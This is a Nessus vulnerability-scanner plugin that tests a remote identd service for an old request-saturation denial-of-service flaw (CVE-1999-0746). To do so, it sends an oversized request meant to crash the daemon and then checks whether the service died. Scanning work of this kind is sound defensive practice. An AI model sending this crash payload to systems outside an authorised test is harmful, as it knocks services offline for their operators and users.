#
# (C) Tenable Network Security, Inc.
#

##############
# References:
##############
#
# Date: Sun, 15 Sep 2002 04:04:09 +0000
# From: "Lance Fitz-Herbert" <fitzies@HOTMAIL.COM>
# Subject: Trillian .74 and below, ident flaw.
# To: NTBUGTRAQ@LISTSERV.NTBUGTRAQ.COM
#

include( 'compat.inc' );

if(description)
{
  script_id(10560);
  script_version ("$Revision: 1.21 $");
  script_cve_id("CVE-1999-0746");
  script_bugtraq_id(587);
  script_osvdb_id(459);

  script_name(english:"SuSE Linux in.identd Request Saturation DoS");
  script_summary(english:"crashes the remote identd");

  script_set_attribute(
    attribute:'synopsis',
    value:'The remote service is vulnerable to denial of service.'
  );

  script_set_attribute(
    attribute:'description',
    value:'Ident is a protocol which gives to the remote server
the name of the user who initiated a given connection.
It\'s mainly used by IRC, SMTP and POP servers to obtain
the login name of the person who is using their services.

There is a flaw in the remote identd daemon which allows anyone
to crash this service remotely.'
  );

  script_set_attribute(
    attribute:'solution',
    value:'Disable this service if you do not use it, or upgrade.'
  );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:N/I:N/A:P");
 script_set_cvss_temporal_vector("CVSS2#E:U/RL:OF/RC:C");
 script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
 script_set_attribute(attribute:"exploit_available", value:"true");

  script_set_attribute(
    attribute:'see_also',
    value:'http://downloads.securityfocus.com/vulnerabilities/exploits/susekill.c'
  );

 script_set_attribute(attribute:"plugin_publication_date", value: "2000/11/29");
 script_set_attribute(attribute:"vuln_publication_date", value: "1999/08/14");
 script_cvs_date("$Date: 2016/12/22 20:32:46 $");
 script_set_attribute(attribute:"plugin_type", value:"remote");
 script_end_attributes();

 script_category(ACT_DENIAL);
 script_copyright(english:"This script is Copyright (C) 2000-2016 Tenable Network Security, Inc.");
 script_family(english:"Denial of Service");
 script_dependencie("find_service1.nasl");
 script_require_ports("Services/auth", 113);
 exit(0);
}

#
# The script code starts here
#

include("global_settings.inc");
include("misc_func.inc");

port = get_service(svc: "auth", default: 113, exit_on_fail: 1);

soc = open_sock_tcp(port);
if (! soc) exit(1);
req = strcat(crap(4096), ',', crap(4096), '\r\n');
 send(socket:soc, data:req);
 sleep(2);
 close(soc);

if (service_is_dead(port: port) > 0)
  security_warning(port);

